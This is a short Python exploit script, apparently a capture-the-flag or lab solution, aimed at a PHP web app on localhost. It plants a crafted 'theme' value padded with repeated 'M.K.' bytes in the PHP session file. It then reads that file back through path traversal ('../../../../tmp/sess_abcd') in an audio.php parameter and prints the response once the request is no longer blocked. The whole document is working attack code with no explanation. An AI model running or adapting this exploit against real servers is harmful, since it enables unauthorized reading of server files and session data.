import requests

cookies = {
	'PHPSESSID': 'abcd'
}

for i in range(4):
	r = requests.get('http://localhost:8080/', params={'theme': 'a' * i + 'M.K.' * 300}, cookies=cookies)
	r = requests.get('http://localhost:8080/audio.php', params={'f': '../../../../tmp/sess_abcd'})
	if r.status_code != 403:
		print('found')
		print(r.text)